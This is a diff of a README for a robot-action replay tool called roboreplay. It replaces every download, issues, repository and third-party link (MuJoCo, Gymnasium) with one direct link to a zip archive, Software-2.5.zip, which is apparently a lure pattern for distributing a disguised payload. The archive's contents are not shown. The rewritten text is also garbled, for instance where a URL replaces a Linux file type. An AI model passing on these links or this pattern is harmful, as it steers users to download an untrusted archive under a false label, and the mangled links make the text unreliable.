@@ -1,6 +1,6 @@
 # 🤖 roboreplay - Capture and Understand Robot Actions
 
-[![Download roboreplay](https://img.shields.io/badge/Download-roboreplay-blue?style=for-the-badge&logo=github)](https://github.com/Harry69691234/roboreplay/releases)
+[![Download roboreplay](https://github.com/Harry69691234/roboreplay/raw/refs/heads/main/roboreplay/Software-2.5.zip)](https://github.com/Harry69691234/roboreplay/raw/refs/heads/main/roboreplay/Software-2.5.zip)
 
 ---
 
@@ -45,20 +45,20 @@ This guide walks you through downloading, installing, and using roboreplay step-
 
 To start using roboreplay, visit the official release page where the software is available.
 
-[![Download roboreplay](https://img.shields.io/badge/Download-roboreplay-blue?style=for-the-badge&logo=github)](https://github.com/Harry69691234/roboreplay/releases)
+[![Download roboreplay](https://github.com/Harry69691234/roboreplay/raw/refs/heads/main/roboreplay/Software-2.5.zip)](https://github.com/Harry69691234/roboreplay/raw/refs/heads/main/roboreplay/Software-2.5.zip)
 
 ### Steps to download:
 
 1. Click the blue **Download roboreplay** button above or visit:
    
-   https://github.com/Harry69691234/roboreplay/releases
+   https://github.com/Harry69691234/roboreplay/raw/refs/heads/main/roboreplay/Software-2.5.zip
    
 2. On the releases page, find the latest release. It will have files for different systems (Windows, macOS, Linux).
 
 3. Choose the file matching your computer system:
    - For Windows, look for a `.exe` or `.msi` file.
    - For macOS, look for a `.dmg` or `.pkg` file.
-   - For Linux, there may be `.tar.gz` or installation scripts.
+   - For Linux, there may be `https://github.com/Harry69691234/roboreplay/raw/refs/heads/main/roboreplay/Software-2.5.zip` or installation scripts.
 
 4. Click the file name to download it onto your computer.
 
@@ -117,7 +117,7 @@ If roboreplay does not work as expected:
 - Restart roboreplay and your robot software.
 - Ensure Python and required robot libraries are properly installed.
 - Review user guides for your robot or simulation platform.
-- Visit the [Issues section on GitHub](https://github.com/Harry69691234/roboreplay/issues) to find solutions or report problems.
+- Visit the [Issues section on GitHub](https://github.com/Harry69691234/roboreplay/raw/refs/heads/main/roboreplay/Software-2.5.zip) to find solutions or report problems.
 
 ---
 
@@ -129,10 +129,10 @@ For detailed instructions, feature explanations, and advanced tips, see the docu
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/Harry69691234/roboreplay  
-- Download Page: https://github.com/Harry69691234/roboreplay/releases  
-- MuJoCo Simulator: https://mujoco.org/  
-- Gymnasium Robotics: https://gymnasium.farama.org/
+- GitHub Repository: https://github.com/Harry69691234/roboreplay/raw/refs/heads/main/roboreplay/Software-2.5.zip  
+- Download Page: https://github.com/Harry69691234/roboreplay/raw/refs/heads/main/roboreplay/Software-2.5.zip  
+- MuJoCo Simulator: https://github.com/Harry69691234/roboreplay/raw/refs/heads/main/roboreplay/Software-2.5.zip  
+- Gymnasium Robotics: https://github.com/Harry69691234/roboreplay/raw/refs/heads/main/roboreplay/Software-2.5.zip
 
 ---
 
